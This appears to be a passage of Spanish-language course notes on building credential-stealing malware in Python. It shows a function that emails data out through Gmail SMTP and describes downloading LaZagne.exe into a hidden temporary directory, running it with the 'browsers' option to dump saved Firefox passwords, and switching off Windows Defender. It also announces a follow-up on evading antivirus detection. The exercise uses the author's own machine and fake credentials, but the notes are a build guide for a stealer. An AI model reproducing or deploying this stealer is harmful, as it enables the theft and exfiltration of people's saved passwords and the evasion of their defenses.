# Introducción

Primeramente, nos centraremos en la creación de un malware diseñado para obtener y enviar las credenciales almacenadas en el navegador por correo electrónico en texto claro. Esto nos será de ayuda para comprender cómo se pueden explotar aplicaciones comunes para acceder a la información sensible. 

En este caso haremos uso de la herramienta **lazagne** el cual es un ejecutable que busca recopilar información de la máquina víctima y aunque esta primera fase para ver como funciona esto veremos como el propio Windows defender, lo desactivaremos un momento para observar como funciona con la opción específica **browsers**. 

Después de esto haremos un script ya enfocado en evitar la detección de Windows, defender y enfocado en recopilar las contraseñas almacenadas en el navegador Firefox y, aunque estas se almacenan encriptadas, existen formas de poder verlas en texto claro.
# Práctica

Nosotros podremos desde nuestra máquina Windows de atacante hacer nuestro script y luego pasarlo a nuestra máquina víctima, pero en este caso haremos todo en la misma máquina. 
Comenzaremos descargando el instalable de Python desde la página oficial y lo instalaremos seleccionando todas las opciones. Este se descarga de la página oficial [python3](https://www.python.org/downloads/). También instalaremos el navegador Firefox. 

Una vez instalado, desde la barra de búsqueda ejecutaremos el IDLE de Python. 

Aquí ya tendremos un entorno en el cual podremos escribir nuestros scripts y almacenarlos en alguna ruta del sistema. 

Para la práctica que realizaremos, en el navegador Firefox iremos a una página como Facebook y colocaremos unas credenciales falsas e intentaremos loguearnos. Evidentemente, no funcionará el logueo, pero almacenaremos las credenciales en el navegador.

![[Offensive/Malware/images/001.PNG]]

Ahora en el IDLE de Python le daremos a **new** y crearemos un nuevo archivo. 

Esto nos dará una especie de editor de texto, donde de primeras nos traeremos la función que utilizamos anteriormente para el correo con las librerías **smtplib** y **email.mime.text** de la cual extraíamos **MIMEText**:

```python3
def send_email(subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            try:
                smtp_server.login(sender, password)
                smtp_server.sendmail(sender, recipients, msg.as_string())
            except smtplib.SMTPAuthenticationError:
                print(colored("\n[!] Incorrect credentials to send email.\n", "red"))
                self.shutdown()
                os._exit(1)
```

![[Offensive/Malware/images/002.PNG]]

Con ello ahora consideraríamos la librería **requests**. Como ahora estamos construyendo el script y todo a nivel de pruebas, será necesario instalar las librerías. De cara a nuestra aplicación final que evitara el Windows defender, ya no tendremos problemas con esto, ya que se encapsularán en la aplicación las librerías al volverlo un ejecutable.

```pip
pip install requests
```

Con la librería requests nos traeremos el archivo ejecutable de **Lazagne**. Veremos cómo al almacenarlo como archivo nos saldrá el antivirus. 

Además, utilizaremos la librería **tempfile** para crear un directorio temporal y no almacenarlo en un lugar a la vista, con esta librería utilizando el método **mkdtemp()** crearemos un directorio temporal al cual nos cambiaremos con **os.chdir()** y le pasamos el nombre del directorio temporal el cual nos es retornado por **mkdtemp()** de la librería **tempfile**.

![[Offensive/Malware/images/003.PNG]]

Con requests hacemos una petición al [repositorio de lazagne](https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe) apuntando específicamente al archivo ejecutable en su versión **2.4.5** que es la que se encuentra funcional para la extracción de las contraseñas de los navegadores. 

Una vez dentro del directorio, almacenamos el archivo con **open**, extrayendo el contenido de nuestra solicitud **get**. Con ello lo almacenaremos en la ruta recién creada y veremos cómo automáticamente nos salta el **Windows Defender**:

![[Offensive/Malware/images/004.PNG]]

El antivirus incluso nos eliminará el ejecutable debido a que se detecta automáticamente como malicioso. Nosotros, mediante la librería **subprocess** ejecutamos como comando la ejecución de este. En este caso nos enfocaremos en recuperar el output del comando que ejecutemos, por ello utilizaremos el método **check_output**, donde como primer argumento le pasamos el comando y, como segundo, a nivel de parámetro **shell** lo asignaremos como **True**. 

Finalmente, aplicamos un decode, ya que si no, no veremos completamente el texto del output en los caracteres especiales. Esto se debe a que Windows por detrás no utiliza métodos como el **utf8**, por ello realizaremos el decode con el método de cifrado **cp850** para este caso:

![[Offensive/Malware/images/005.PNG]]

Para que esto nos funcione, tendremos que desactivar el antivirus de Windows un momento, deshabilitando todas las opciones del siguiente apartado:

![[Offensive/Malware/images/006.PNG]]

Recordemos importar todas las librerías necesarias y con ello listo corremos nuestro script:

![[Offensive/Malware/images/007.PNG]]

Esto no nos retorna nada porque, como comando, solo estamos ejecutando **lazagne.exe**, pero le agregaremos la opción **browsers** para recuperar las credenciales de los navegadores. Recordemos que anteriormente simulamos un login y almacenamos esas credenciales, aquí deberían salir:

![[Offensive/Malware/images/008.PNG]]

![[Offensive/Malware/images/009.PNG]]

Viendo cómo funciona, podremos nuevamente habilitar el Windows defender y en los siguientes apuntes trabajaremos un script en Python el cual evite la detección de nuestro malware y también recupere las credenciales.
## Siguientes apuntes

[[Creación de Malware (2-2)]]




 

